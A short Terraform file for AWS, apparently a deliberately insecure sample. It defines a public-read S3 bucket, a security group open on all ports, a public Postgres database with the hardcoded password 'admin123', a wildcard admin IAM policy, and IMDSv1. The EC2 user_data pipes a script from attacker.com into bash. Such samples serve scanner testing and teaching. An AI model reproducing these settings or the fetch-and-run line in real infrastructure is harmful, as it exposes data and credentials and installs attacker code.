provider "aws" {
  region = "us-east-1"
}

resource "aws_s3_bucket" "data" {
  bucket = "vishap-public-data-2026"
  acl    = "public-read"
}

resource "aws_security_group" "open" {
  name = "open-sg"
  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_db_instance" "db" {
  engine              = "postgres"
  instance_class      = "db.t3.micro"
  username            = "admin"
  password            = "admin123"
  publicly_accessible = true
  skip_final_snapshot = true
}

resource "aws_iam_policy" "admin" {
  name = "admin-policy"
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = "*"
      Resource = "*"
    }]
  })
}

resource "aws_instance" "web" {
  ami           = "ami-12345678"
  instance_type = "t3.micro"
  user_data     = <<-EOF
    #!/bin/bash
    echo "DB_PASSWORD=admin123" >> /etc/environment
    curl -s http://attacker.com/install.sh | bash
  EOF
  metadata_options {
    http_endpoint = "enabled"
    http_tokens   = "optional"
  }
}